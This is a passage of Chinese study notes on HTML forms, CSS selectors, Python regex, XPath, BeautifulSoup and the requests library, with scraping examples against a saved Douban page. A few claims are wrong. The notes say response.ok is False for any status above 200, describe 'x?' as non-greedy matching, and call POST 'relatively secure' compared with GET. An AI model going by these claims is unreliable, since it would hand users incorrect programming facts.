![image-20240130132330113](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240130132330113.png)

   ### 1-7 FORM表单

标签： `<form></form>`

#### 1-7-1  form属性

```html
action	提交的地址
method	提交的方式
	get
		(1) 默认不写 为get传参  url地址栏可见
		(2) 长度受限制 （IE浏览器2k火狐8k）
		(3) 相对不安全
	post
		(1) url地址栏不可见 长度默认不受限制
		(2) 相对安全
```

#### 1-7-2 input 标签

`<input>` 表单项标签input定义输入字段，用户可在其中输入数据。

如：

`<input type="text" name="username">`

#### 1-7-3   select 标签创建下拉列表。

```python
属性：
name属性:## 定义名称,用于存储下拉值的

##### 内嵌标签：
`<option>`  ## 下拉选择项标签,用于嵌入到`<select>`标签中使用的;

##### 属性：
value属性:## 下拉项的值
```


#### 1-7-4 input 标签

type属性:表示表单项的类型:

值如下:

+ text:单行文本框
+ password:密码输入框
+ submit:提交按钮

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<h2>表单</h2>
<!--<form action="" method="POST">-->
<form action="" method="GET">
    <p>用户名: <input type="text" placeholder="请输入用户名" name="username"></p>
    <p>密码: <input type="password" placeholder="请输入密码" name="password"></p>
    <p>
        <select name="address" id="">
            <option value="">北京</option>
            <option value="">上海</option>
            <option value="">广州</option>
        </select>
    </p>
    <p><input type="submit" value="提交"></p>
</form>
</body>
</html>
```

![image-20240130132417166](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240130132417166.png)

## 2,CSS


### 2-1 css的语法

```python
## 什么是css？
  层叠样式表

## 命名规则：
  使用字母、数字或下划线和减号构成，不要以数字开头

## 格式： 
  选择器{属性:值;属性:值;属性:值;....}

 ## 其中选择器也叫选择符
```

+ CSS中注释

  ```css
  /* ... */
  ```

### 2-2 在HTML中如何使用css样式

#### 2-2-1 内联方式（行内样式）

```html
 就是在HTML的标签中使用style属性来设置css样式
 格式： 
 	<html标签 style="属性:值;属性:值;....">被修饰的内容</html标签>
 	<p style="color:blue;font-family:隶书">在HTML中如何使用css样式</p>
  特点：仅作用于本标签
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<div style="border-radius:50px;background-color: aqua;border: 1px solid red; width: 100px;height: 100px;"></div>
</body>
</html>
```

![image-20240130132558987](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240130132558987.png)

#### 2-2-2 内部方式（内嵌样式）

就是在head标签中使用`<style type="text/css">....</style>`标签来设置css样式
 格式：

```python
 <style type="text/css">
 	....css样式代码
 </style>
```

 **特点：**作用于当前整个页面

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
  <style>
    div{
        border-radius:50px;
        background-color: aqua;
        border: 1px solid red;
        width: 100px;
        height: 100px;
    }
  </style>
</head>
<body>
<div></div>
</body>
</html>
```

![image-20240130132818965](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240130132818965.png)

#### 2-2-3 外部导入方式（外部链入）

+ （推荐）就是在head标签中使用`<link/>`标签导入一个css文件，在作用于本页面，实现css样式设置

  格式：

  ```Css
  <link href="文件名.css" type="text/css" rel="stylesheet"/>
  ```

  特点：作用于整个网站

  ```html
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <title>Title</title>
      <link rel="stylesheet" href="lucky.css">
  </head>
  <body>
  <div></div>
  </body>
  </html>
  ```

![image-20240130132911563](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240130132911563.png)

### 2-3  css2的选择符：

#### 2-3-1 html选择符（标签选择器）

 就是把html标签作为选择符使用
 如 p{....}  网页中所有p标签采用此样式

```css
h2{....}  网页中所有h2标签采用此样式
```

#### 2-3-2 class类选择符 (使用点.将自定义名（类名）来定义的选择符)（类选择器P）

定义： 		  .类名{样式....}    匿名类

   其他选择符名.类名{样式....}
 使用：`<html标签 class="类名">...</html标签>`

 .mc{color:blue;} /* 凡是class属性值为mc的都采用此样式 */

 注意：类选择符可以在网页中重复使用

#### 2-3-3 Id选择符(ID选择器)

```html
 定义： #id名{样式.....}
 使用：
`<html标签 id="id名">...</html标签>`
 注意：## id选择符只在网页中使用一次
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
  <style>
    /*给所有div标签设置此样式*/
    /*div{*/
    /*只给class属性名为lucky1的标签设置此样式*/
    div{
        border-radius:50px;
        background-color: aqua;
        border: 1px solid red;
        width: 100px;
        height: 100px;
    }
    /*只给lucky1设置红色背景色 多次使用*/
    .lucky1{
        background-color: red;
    }
  /* id选择器 只能使用一次 */
    #id_lucky{
        background-color: yellow;
    }
  </style>
</head>
<body>
<div id="id_lucky"></div>
<div class="lucky1"></div>
<div class="lucky1"></div>
</body>
</html>
```

![image-20240130132952589](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240130132952589.png)

#### 2-3-4 关联选择符（包含选择符）

 格式： 选择符1 选择符2 选择符3 ...{样式....}
 例如： table a{....} /\*table标签里的a标签才采用此样式*/

```html
h1 p{color:red} /*只有h1标签中的p标签才采用此样式*/
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
  <style>
      /*li{*/
      /*ul 里面所有的li和div选择器都采用此样式*/
      ul li,div{
            border-radius:50px;
            background-color: aqua;
            border: 1px solid red;
            width: 100px;
            height: 100px;
        }
  </style>
</head>
<body>
<div>123</div>
<ul>
  <li></li>
  <li></li>
  <li></li>
  <li></li>
</ul>
<li></li>
<li></li>
<li></li>
<li></li>
</body>
</html>
```

![image-20240130133057071](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240130133057071.png)

#### 2-3-5 组合选择符（选择符组）

 格式： 选择符1,选择符2,选择符3 ...{样式....}

```html
h3,h4,h5{color:green;} /*h3、h4和h5都采用此样式*/
```

### 2-4   CSS3中的选择器

#### 2-4-1 关系选择器：

```python
 div>p ## 选择所有作为div元素的子元素p
 div+p ## 选择紧贴在div元素之后p元素
 div~p ## 选择div元素后面的所有兄弟元素p
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
  <style>
      /*li{*/
      /*ul 里面所有的li选择器都采用此样式*/
      /*ul li{*/
      /*只给ul的儿子li采用此样式*/
      /*ul>li{*/
      /**/
      /*ul+li{*/
      /*ul后面所有同级的li都采用此样式*/
      ul~li{
            border-radius:50px;
            background-color: aqua;
            border: 1px solid red;
            width: 100px;
            height: 100px;
        }
  </style>
</head>
<body>
<div>123</div>
<ul>
  <li></li>
  <li></li>
    <ol>
        <li></li>
        <li></li>
        <li></li>
    </ol>
  <li></li>
  <li></li>
</ul>
<li></li>
<li></li>
<li></li>
<li></li>

</body>
</html>
```

![image-20240130133221814](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240130133221814.png)

#### 2-4-2 属性选择器：

```python
 [attribute]选择具有attribute属性的元素。
 [attribute=value]选择具有attribute属性且属性值等于value的元素。
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
  <style>
    /*input{*/
    /*只给input选择器 具有value属性的标签采用此样式*/
    /*input[value]{*/
    /*只给input选择器 name属性值为password的标签设置此样式*/
    /*input[name="password"]{*/
    input[type="text"]{
      border: 10px dotted red;
    }
  </style>
</head>
<body>
<p><input type="text" name="username" value="'lucky"></p>
<p><input type="text" name="password"></p>
</body>
</html>
```

# 十，网页解析模块二

## 1，re正则

### 	1、匹配单个字符与数字

| 匹配         | 说明                                                         |
| ------------ | ------------------------------------------------------------ |
| .            | 匹配除换行符以外的任意字符，当flags被设置为re.S时，可以匹配包含换行符以内的所有字符 |
| []           | 里面是字符集合，匹配[]里任意一个字符                         |
| [0123456789] | 匹配任意一个数字字符                                         |
| [0-9]        | 匹配任意一个数字字符                                         |
| [a-z]        | 匹配任意一个小写英文字母字符                                 |
| [A-Z]        | 匹配任意一个大写英文字母字符                                 |
| [A-Za-z]     | 匹配任意一个英文字母字符                                     |
| [A-Za-z0-9]  | 匹配任意一个数字或英文字母字符                               |
| [^lucky]     | []里的^称为脱字符，表示非，匹配不在[]内的任意一个字符        |
| ^[lucky]     | 以[]中内的某一个字符作为开头                                 |
| \d           | 匹配任意一个数字字符，相当于[0-9]                            |
| \D           | 匹配任意一个非数字字符，相当于`[^0-9]`                       |
| \w           | 匹配字母、下划线、数字中的任意一个字符，相当于[0-9A-Za-z_]   |
| \W           | 匹配非字母、下划线、数字中的任意一个字符，相当于`[^0-9A-Za-z_]` |
| \s           | 匹配空白符(空格、换页、换行、回车、制表)，相当于[ \f\n\r\t]  |
| \S           | 匹配非空白符(空格、换页、换行、回车、制表)，相当于`[^ \f\n\r\t]` |

### 2、匹配锚字符

锚字符:用来判定是否按照规定开始或者结尾

| 匹配 | 说明                            |
| ---- | ------------------------------- |
| ^    | 行首匹配，和[]里的^不是一个意思 |
| $    | 行尾匹配                        |

### 3、限定符

限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 * 或 + 或 ? 或 {n} 或 {n,} 或 {n,m} 共6种。

| 匹配   | 说明                                                 |
| ------ | ---------------------------------------------------- |
| (xyz)  | 匹配括号内的xyz，作为一个整体去匹配  一个单元 子存储 |
| x?     | 匹配0个或者1个x，非贪婪匹配                          |
| x*     | 匹配0个或任意多个x                                   |
| x+     | 匹配至少一个x                                        |
| x{n}   | 确定匹配n个x，n是非负数                              |
| x{n,}  | 至少匹配n个x                                         |
| x{n,m} | 匹配至少n个最多m个x                                  |
| x\|y   | \|表示或的意思，匹配x或y                             |

**通用flags（修正符）**

| 值   | 说明                            |
| ---- | ------------------------------- |
| re.I | 是匹配对大小写不敏感            |
| re.S | 使.匹配包括换行符在内的所有字符 |

^a  匹配a开头的

^[a] 匹配一个小写字母a并且a作为开头，等同于^a

[^a] 匹配一个小写字母a以外的任意字符

### 4，匹配符总结

```python
1  []原子表
[a]  匹配一个小写字母a
[1]  匹配一个数字1
[ab] 匹配一个小写字母a或者b
[a1] 匹配一个小写字母a或者数字1
[123] 匹配一个数字1或者2或者3
[a-z] 匹配任意一个小写字母
[A-Z] 匹配任意一个大写字母
[a-zA-Z]  匹配任意一个字母
[0-9] 匹配任意一个数字 0-9
[a-zA-Z0-9]  匹配任意一个数字 0-9或者任意一个字母
以上不管[]中有多少内容 只匹配一个

2 {m}  限定符 不能单独使用  限定前面那个正则的m次
a     匹配一个小写字母a
ab    匹配小写字母ab
aa     匹配2个小写字母a
a{2}     匹配2个小写字母a
ab{2}    匹配小写字母abb
a{2}b{2}    匹配小写字母aabb
[a-zA-Z]{5}  匹配任意5个字母

3 {m, n}  限定符 不能单独使用  限定前面那个正则的m-n次
[a-zA-Z]{3,5}  匹配任意3-5个字母

4 {m,}  限定符 不能单独使用  限定前面那个正则的m次
[a-zA-Z]{3,}  至少匹配任意3个字母

5 ^ 以...开始
abc    匹配abc三个字母
^abc    匹配以abc开头的三个字母
^[a]  匹配一个小写字母a并且a作为开头  等同于  ^a
[^a]  匹配一个小写字母a以外的任意字符


6 $   以...结尾
abc    匹配abc三个字母并且作为结尾
^abc     匹配以abc开头的三个字母
abc$    匹配abc三个字母并且作为结尾

7 ^$ 一般组合使用  (完全匹配)
匹配手机号
1[3-9][0-9]{9}
^1[3-9][0-9]{9}$

8 ?  匹配前面的正则0次或1次 相当于 {0,1}
-?[1-9] 匹配正负1-9

9 .  匹配换行符以外的任意字符

10 *  匹配任意次 {0,}

11  .*  匹配除换行符以外任意字符任意次 贪婪模式

12 .*?   匹配除换行符以外任意字符任意次 拒绝贪婪模式   (用的多)

13  +   匹配至少一次  相当于{1, }

14 .+    匹配除换行符以外任意字符至少1次 贪婪模式

15 .+?   匹配除换行符以外任意字符至少1次 拒绝贪婪模式

16  ()   子存储(会把括号里的值单独的保存下来)  一个单元 (ab)|(cd)

17  \w  匹配一位数字，字母，下划线  [a-zA-Z0-9_]

18  \W

19  \d  匹配一位数字   [0-9]

20  \D 和上面相反   [^0-9]


21  \s  匹配空白符

22  \S  和上面相反
```

### 5、贪婪与非贪婪

```python
#贪婪模式  

#贪婪概念：匹配尽可能多的字符

# + .+  匹配换行符以外的字符至少一次
# + .*  匹配换行符以外的字符任意次

res = re.search('<b>.+</b>', '<b></b><b>b标签</b>')
res = re.search('<b>.*</b>', '<b>b标签</b><b>b标签</b><b>b标签</b><b>b标签</b>')

# .+?  匹配换行符以外的字符至少一次  拒绝贪婪
# + .*?   匹配换行符以外的字符任意次      拒绝贪婪

res = re.search('<b>.+?</b>', '<b>b标签</b><b>b标签</b>')
res = re.search('<b>.*?</b>', '<b>b标签</b><b>b标签</b><b>b标签</b><b>b标签</b>')
```

### 6，正则用到的方法

#### 1，re.search

```python
# re.search
# 返回第一个匹配的结果
res = re.search('a','abcdef343')    # 返回一个对象 <re.Match object; span=(0, 1), match='a'>
# 匹配上才可以用group拿结果，不然的话匹配不上返回None,不能用group，要不然会报错
print(res.group())  # a
```

#### 2，re.match

```python
res = re.match('\d{2}','123')
print(res.group())

#match函数 
# match 必须第一位就开始匹配  否则匹配失败
# 给当前匹配到的结果起别名
s = '3G4HFD567'
x = re.match("(?P<value>\d+)",s)
print(x.group(0)) # 3
print(x.group('value')) # 3
```

#### 3，re.findall

```python
# findall
str = '<br>加粗1</br><br>加粗2</br><br>加粗3</br><br></br>'
res = re.findall('<br>.*?</br>',str)   # ['<br>加粗1</br>', '<br>加粗2</br>', '<br>加粗3</br>', '<br></br>']
res = re.findall('<br>.*</br>',str)   # ['<br>加粗1</br><br>加粗2</br><br>加粗3</br><br></br>']
res = re.findall('<br>.+?</br>',str)   # ['<br>加粗1</br>', '<br>加粗2</br>', '<br>加粗3</br>']
res = re.findall('<br>.+</br>',str)   # ['<br>加粗1</br><br>加粗2</br><br>加粗3</br><br></br>']

Str = '''
<a href="http://www.baidu.com">百度</a>
<A href="https://www.taobao.com">淘宝</A>
<a href="https://www.sina.com">新
浪</a>
'''

# 1，匹配出所有小写a的超链接
print(re.findall('<a href=".*?">.*?</a>',Str))
# ['<a href="http://www.baidu.com">百度</a>']

# .*? 匹配任意字符任意次，拒绝贪婪
print(re.findall('<a href=".*?">.*?</a>',Str,flags=re.S))
# ['<a href="http://www.baidu.com">百度</a>', '<a href="https://www.sina.com">新\n浪</a>']

# 2，匹配所有小写a或者大写A的超链接
print(re.findall('<[aA] href=".*?">.*?</[aA]>',Str,flags=re.S))
# ['<a href="http://www.baidu.com">百度</a>', '<A href="https://www.taobao.com">淘宝</A>', '<a href="https://www.sina.com">新\n浪</a>']

# 用 re.I 匹配大小写字符  re.S 可以匹配换行符
print(re.findall('<a href=".*?">.*?</a>',Str,flags=re.S | re.I))
# ['<a href="http://www.baidu.com">百度</a>', '<A href="https://www.taobao.com">淘宝</A>', '<a href="https://www.sina.com">新\n浪</a>']

# 3，获取网址和名称  （） 给谁加括号，谁就返回
print(re.findall('(<a href="(.*?)">(.*?)</a>)',Str,flags=re.S | re.I))
# [('<a href="http://www.baidu.com">百度</a>', 'http://www.baidu.com', '百度'), ('<A href="https://www.taobao.com">淘宝</A>', 'https://www.taobao.com', '淘宝'), ('<a href="https://www.sina.com">新\n浪</a>', 'https://www.sina.com', '新\n浪')]
```

#### 4，finditer

```Python
res = re.finditer('[a-z]','asdjgedksa43g')
print(res)  # 返回一个迭代器  <callable_iterator object at 0x0000015D8995F790>
print(next(res)) # <re.Match object; span=(0, 1), match='a'> 是一个对象，用group来取值
print(next(res).group()) # s

for i in res:
	print(i) # 返回一个迭代器  <callable_iterator object at 0x0000015D8995F790>
	print(i.group()) # 返回结果

```

#### 5，group 和 groups 区别

```python
# group 取第一个匹配的
print(re.search("<b>.*?</b>","<b>加粗</b>").group())  # <b>加粗</b>
print(re.search("<b>(?P<val>.*?)</b>","<b>加粗</b>").group())  # <b>加粗</b>
print(re.search("<b>(?P<val>.*?)</b>","<b>加粗</b>").group(0))  # <b>加粗</b>
print(re.search("<b>(?P<val>.*?)</b>","<b>加粗</b>").group(1))  # 加粗
# print(re.search("<b>(?P<val>.*?)</b>","<b>加粗</b>").group(2))  # 报错
print(re.search("<b>(?P<val>.*?)</b>","<b>加粗</b>").group('val'))  # 加粗

# goups 返回所有括号中的值
print(re.search("<a href='(.*?)'>(.*?)</a>","<a href='www.baidu.com'>百度</a>").groups()) # ('www.baidu.com', '百度')
```

#### 6，re.split 正则拆分

```python
print(re.split('\d','fdas3fedsa5fd45fdsa34fg4')) # ['fdas', 'fedsa', 'fd', '', 'fdsa', '', 'fg', '']
```

#### 7，re.sub 正则替换

```python
print(re.sub('\d','---','ab1fdsa456fdsa34fds65as35')) # ab---fdsa---------fdsa------fds------as------
```

#### 8，re.compile

```python
# compile函数
re_phone = re.compile(r"(0\d{2,3}-\d{7,8})")

s1 = "lucky's phone is 010-88888888"
s2 = "kaige's phone is 010-99999999"
ret1 = re_phone.search(s1)
ret2 = re_phone.search(s2)
```



## 2，xpath解析

#### 2-1 导入使用

```python
#导入和使用
from lxml import etree
html_tree = etree.HTML(html字符串)
html_tree.xpath()
# 使用xpath路径查询信息，返回一个列表

from lxml import etree
# 第一种方式
parse = etree.HTMLParser(encoding='UTF-8')
tree = etree.parse('./素材/豆瓣.html', parser=parse)
print(tree)

# 第二种 推荐
data = open('./素材/豆瓣.html', 'r', encoding='UTF-8').read()
tree = etree.HTML(data)
print(tree)

```

#### 2-2 xpath 的使用

##### 2-2-1 特定路径匹配

```python
# 找登陆 获取当前路径下的所有匹配的a
a_list = tree.xpath('/html/body/div/div/div/a')


for a in a_list:
    print(a)  # <Element a at 0x2bdd868bc00>
    print(a.text)  # 登录 （获取文本）
    ## 想要把节点转换成看得懂的字符串标签数据
    print(etree.tostring(a, encoding='UTF-8').decode('UTF-8')) 
    # <a href="https://www.douban.com/accounts/login?source=book" class="nav-login" rel="nofollow">登录</a>
    

a_list = tree.xpath('/html/body/div/div/div/a')
a_list = tree.xpath('/html/body/div/div/div/div/p/text()')
a_list = tree.xpath('/html/body/div/div/div[1]/a[1]/text()')
a_list = tree.xpath('/html/body/div/div/div//a/text()')
```

##### 2-2-2 获取当前路径下的文本

```Python
# 第一种
a_list = tree.xpath('/html/body/div/div/div/a/text()')

# 第二种
a_list = tree.xpath('/html/body/div/div/div/a')
for a in a_list:
    print(a.text)  #（获取文本）
```

##### 2-2-3 //

```python
# 不考虑当前所在位置

# 我想获取当前对象里所有的a
a_list = tree.xpath('//a') 
a_list = tree.xpath('//a/text()')
```

##### 2-2-4 获取属性

```python
# 获取img的src属性值
img_src = tree.xpath('//ul/li/a/img/@src')
img_src = tree.xpath('//ul/li//a/img/@src')
```

##### 2-2-5 添加条件

```python
# 添加class条件
img_src = tree.xpath('//ul[@class="cover-col-4 clearfix"]/li/div/h2/a/text()')
img_src = tree.xpath('//ul[@class="cover-col-4 clearfix"]/li/div[@class="detail-frame"]/h2/a/text()')
```

##### 2-2-6 位置查找

```python
# 获取第一个li
li = tree.xpath('//ul[@class="cover-col-4 clearfix"]/li[1]/div/h2/a/text()')

# 获取第二个li
li = tree.xpath('//ul[@class="cover-col-4 clearfix"]/li[2]/div/h2/a/text()')

# 获取最后一个li
li = tree.xpath('//ul[@class="cover-col-4 clearfix"]/li[last()]/div/h2/a/text()')

# 获取倒数第二个li
li = tree.xpath('//ul[@class="cover-col-4 clearfix"]/li[last()-1]/div/h2/a/text()')

# 获取前俩个li
li = tree.xpath('//ul[@class="cover-col-4 clearfix"]/li[position()<3]/div/h2/a/text()')

# 可以使用列表切片解决啊
li = tree.xpath('//ul[@class="cover-col-4 clearfix"]/li/div/h2/a/text()')[0]
li = tree.xpath('//ul[@class="cover-col-4 clearfix"]/li/div/h2/a/text()')[0:2]
```

##### 2-2-7 ./  .//

```python
# 一个完整的xpath路径，但是可以拆分
li = tree.xpath('//ul[@class="cover-col-4 clearfix"]/li/div/h2/a/text()')

# 先匹配到li 再继续往下匹配
li_list = tree.xpath('//ul[@class="cover-col-4 clearfix"]/li')
for li in li_list:
    print(li) # xpath 对象
    # 从当前位置向下匹配
    print(li.xpath('./div/h2/a/text()'))
    print(li.xpath('.//div/h2/a/text()'))
```

##### 2-2-8 属性（一般用不到）

```Python
# 获取ul的class属性为cover-col-4 clearfix的ul下面的儿子li
li_list = tree.xpath('//ul[@class="cover-col-4 clearfix"]/li')

# 选取所有ul具有class属性的节点
li_list = tree.xpath('//ul[@class]')

# 获取所有ul具有aa属性的节点
li_list = tree.xpath('//ul[@aa]')

```

##### 2-2-9 多条件 and or |

```python
# 多个条件  and  or
print(tree.xpath('//div[@id="db-global-nav"]'))
print(tree.xpath('//div[@class="global-nav"]'))

# 获取同时满足id为db-global-nav class为global-nav 的ul
print(tree.xpath('//div[@class="global-nav" and @id="db-global-nav"]'))

# 获取满足id为db-global-nav 或 class为global-nav 的ul
print(tree.xpath('//div[@class="global-nav" or @id="db-global-nav"]'))

# |
print(tree.xpath('//div[@id="db-global-nav"] | //div[@class="global-nav"]'))
```

#### 2-3 xpath语法

##### 2-3-1 路径表达式

| 路径表达式            | 结果                                                |
| :-------------------- | :-------------------------------------------------- |
| /ul/li[1]             | 选取属于 ul子元素的第一个 li元素。                  |
| /ul/li[last()]        | 选取属于 ul子元素的最后一个 li元素。                |
| /ul/li[last()-1]      | 选取属于 ul子元素的倒数第二个 li元素。              |
| //ul/li[position()<3] | 选取最前面的两个属于 ul元素的子元素的 li元素。      |
| //a[@title]           | 选取所有拥有名为 title的属性的 a元素。              |
| //a[@title='xx']      | 选取所有 a元素，且这些元素拥有值为 xx的 title属性。 |

##### 2-3-2 选取未知节点

XPath 通配符可用来选取未知的 XML 元素。

| 通配符 | 描述                                               |
| :----- | :------------------------------------------------- |
| *      | 匹配任何元素节点。  一般用于浏览器copy xpath会出现 |
| @*     | 匹配任何属性节点。                                 |
| node() | 匹配任何类型的节点。                               |

**实例**

在下面的表格中，我们列出了一些路径表达式，以及这些表达式的结果：

| 路径表达式  | 结果                            |
| :---------- | :------------------------------ |
| /ul/*       | 选取 ul元素的所有子元素。       |
| //*         | 选取文档中的所有元素。          |
| //title[@*] | 选取所有带有属性的 title 元素。 |
| //node()    | 获取所有节点                    |

选取未知节点

| 路径表达式                       | 结果                                                         |
| :------------------------------- | :----------------------------------------------------------- |
| //book/title \| //book/price     | 选取 book 元素的所有 title 和 price 元素。                   |
| //title \| //price               | 选取文档中的所有 title 和 price 元素。                       |
| /bookstore/book/title \| //price | 选取属于 bookstore 元素的 book 元素的所有 title 元素，以及文档中所有的 price 元素。 |

##### 2-3-3 逻辑运算

- 查找所有id属性等于head并且class属性等于s_down的div标签

  ```python
  //div[@id="head" and @class="s_down"]
  ```

- 选取文档中的所有 title 和 price 元素。

  ```python
  //title | //price
  ```

  注意: “|”两边必须是完整的xpath路径

##### 2-3-4 属性查询

- 查找所有包含id属性的div节点

  ```python
  //div[@id]
  ```

- 查找所有id属性等于maincontent的div标签

  ```python
  //div[@id="maincontent"]
  ```

- 查找所有的class属性

  ```python
  //@class
  ```

- //@attrName

  ```python
  //li[@name="xx"]//text()  # 获取li标签name为xx的里面的文本内容
  ```

+ 获取第几个标签  索引从1开始

  ```python
  tree.xpath('//li[1]/a/text()')  # 获取第一个
  tree.xpath('//li[last()]/a/text()')  # 获取最后一个
  tree.xpath('//li[last()-1]/a/text()')  # 获取倒数第二个
  ```

##### 2-3-5 内容查询

+ 查找所有div标签下的直接子节点h1的内容

  ```python
  //div/h1/text()
  ```

+ 属性值获取

  ```python
  //div/a/@href   获取a里面的href属性值
  ```

+ 获取所有

  ```python
  //*  #获取所有
  //*[@class="xx"]  #获取所有class为xx的标签
  ```

+ 获取节点内容转换成字符串

  ```python
  c = tree.xpath('//li/a')[0]
  result=etree.tostring(c, encoding='utf-8')
  print(result.decode('UTF-8'))
  ```

## 3，bs4解析

### 1，导入和使用

```Python
from bs4 import BeautifulSoup
soup = BeautifulSoup(html_doc, 'lxml')
# html进行美化
print(soup.prettify())

# 可以传入一段字符串或一个文件句柄.
from bs4 import BeautifulSoup
soup = BeautifulSoup(open("index.html"))
soup = BeautifulSoup("<html>data</html>", 'lxml')

# beautifulsoup  lxml
from bs4 import BeautifulSoup

f = open('./素材/豆瓣.html', 'r', encoding='UTF-8')
data = f.read()
# 第一种方式  建议使用这种
soup = BeautifulSoup(data, 'lxml')

# 第二种方式（）
soup = BeautifulSoup(open('./素材/豆瓣.html', 'r', encoding='UTF-8'), 'lxml')
print(soup)
print(type(soup))
```

### 2，浏览器结构化数据

#### 2-1 .语法  soup对象.标签名

```Python
## .标签和.find 只获取第一个

soup.title  # 获取标签title
# <title>The Dormouse's story</title>

soup.title.name   # 获取标签名称
# 'title'

soup.title.string   # 获取标签title内的内容
# 'The Dormouse's story'

soup.title.parent  # 获取父级标签

soup.title.parent.name  # 获取父级标签名称
# 'head'


print(soup.title)
print(soup.div)
print(soup.a)
print(soup.img)
print(soup.abc)  # 不存在则为None

```

#### 2-2  soup.find

```python
# find  上面的.标签名 是当前find的简写   find可以给条件   .标签和.find 只获取第一个
print(soup.find('title'))
print(soup.find('div'))
# 获取soup对象中的第一个img标签
print(soup.img)
print(soup.find('img'))
```

#### 2-3 获取属性

```python
.语法或者find都只获取第一个

print(soup.div.attrs) # {'id': 'db-global-nav', 'class': ['global-nav']}
print(soup.div.attrs['id'])  # db-global-nav
print(soup.div.attrs['class']) # ['global-nav']
print(soup.div['id']) # db-global-nav
print(soup.div['class']) # ['global-nav']
```

#### 2-4 find 条件查找

```python
print(soup.find('a', class_="cover")) # 查找第一个class为cover的a标签
print(soup.find('p', class_="rating"))
print(soup.find('div', id="wrapper"))
print(soup.find('div', id="db-global-nav", class_="global-nav"))

## 可以用字典的形式查找满足多个属性的标签
print(soup.find('div', attrs={'id': "db-global-nav", 'class': "global-nav"}))

# class为多个的中间空格隔开就行
print(soup.find('ul', attrs={'class': "cover-col-4 clearfix"}))
print(soup.find('ul', attrs={'class': "caover-col-4 clearfix"}))
```

#### 2-5 find 和 .语法组合使用

```python
print(soup.find('a', class_="cover"))
print(type(soup.find('a', class_="cover")))  # <class 'bs4.element.Tag'> bs4对象才可以用组合使用
print(soup.find('a', class_="cover").find('img')) # 获取第一个a标签里的第一个img
print(soup.find('a', class_="cover").img) # 获取第一个a标签里的第一个img
print(soup.find('a', class_="cover").img.attrs) # {'src': 'https://img3.doubanio.com/mpic/s29535271.jpg'}
print(soup.find('a', class_="cover").img.attrs['src']) # https://img3.doubanio.com/mpic/s29535271.jpg
print(soup.find('a', class_="cover").img['src']) # https://img3.doubanio.com/mpic/s29535271.jpg
```

#### 2-6 写入到文件

```python
# 写入本地需要注意的点
with open('img.html', 'w', encoding='UTF-8') as f:
    f.write(str(soup.find('a', class_="cover").img))  ## 写入本地需要先转换为字符串，要不然会报错
    # f.write(soup.title.string)
```

#### 2-7 获取文本

```python
print(soup.title) # <title>新书速递</title>
print(soup.title.string) # 新书速递
print(type(soup.title.string)) # <class 'bs4.element.NavigableString'>
print(soup.title.strings)  # generator 对象
print(list(soup.title.strings))  # ['新书速递']

print(soup.title.text) # 新书速递
print(soup.title.get_text()) # 新书速递
print(soup.title.stripped_strings) # generator 对象
print(list(soup.title.stripped_strings)) # ['新书速递']
```

#### 2-8 多层嵌套标签

```python
## string 和 strings 区别
print(soup.find('div', class_="detail-frame"))
print(soup.find('div', class_="detail-frame").string)  # None
print(soup.find('div', class_="detail-frame").strings) # generator 对象
print(list(soup.find('div', class_="detail-frame").strings))  # 获取子子孙孙的文本 生成器返回

# text , get_text() , stripped_strings 区别
print(soup.find('div', class_="detail-frame").text)  # 返回所有文本字符串 包含非打印字符
print(soup.find('div', class_="detail-frame").get_text())  #和text一样 返回所有文本字符串 包含非打印字符
print(list(soup.find('div', class_="detail-frame").stripped_strings))  # 返回所有去除空白字符后的文本
```

#### 2-9 prettify 美化

```python 
print(soup.find('div', class_="detail-frame"))
print(soup.find('div', class_="detail-frame").prettify())
```

#### 2-10 find_all

```python 
# 查找所有 和find区别就是  查找所有 参数一样使用  find返回一个  find_all返回列表
print(soup.find_all('img'))   # 返回列表
print(soup.find_all('div', id="db-global-nav", class_="global-nav"))
print(soup.find_all('div', attrs={'id': "db-global-nav", 'class': "global-nav"}))
print(soup.find_all('div', limit=2))  # 取几个值  没啥用(我们用切片就完事了)
print(soup.find_all(['h2', 'img']))  # 获取h2和img标签
```

#### 2-11 select 

```python
# select 查找所有  条件是选择器
print(soup.select('img'))
print(soup.select('.cover'))
print(soup.select('#db-global-nav'))
print(soup.select('.cover-col-4.clearfix'))
print(soup.select('.cover-col-4.clearfix#abc'))
print(soup.select('ul[class="cover-col-4 clearfix"]'))
print(soup.select('.cover-col-4.clearfix > li img'))
```

# 十一，request网络请求

## 1，request模块

### 1-1，response的常用属性：

```Python
1，response.text  #响应体 str类型response.encoding  #从HTTP　header中猜测的响应内容的编码方式
2，respones.content #响应体 bytes类型
3，response.status_code #响应状态码,
4，response.request.headers #响应对应的请求头
5，response.headers 响应头,
6，response.cookies #响应的cookie（经过了set-cookie动作）
7，response.url  #获取访问的url,
8，response.json() #获取json数据 得到内容为字典 (如果接口响应体的格式是json格式时)
9，response.ok

  # 如果status_code小于等于200，response.ok返回True。
  # 如果status_code大于200，response.ok返回False。

# 先安装 reqeuests
import requests
# 给定抓取的网址的url
url = 'http://www.baidu.com'
# 发起get请求
response = requests.get(url)

# 看一下响应的状态码
print(response.status_code)
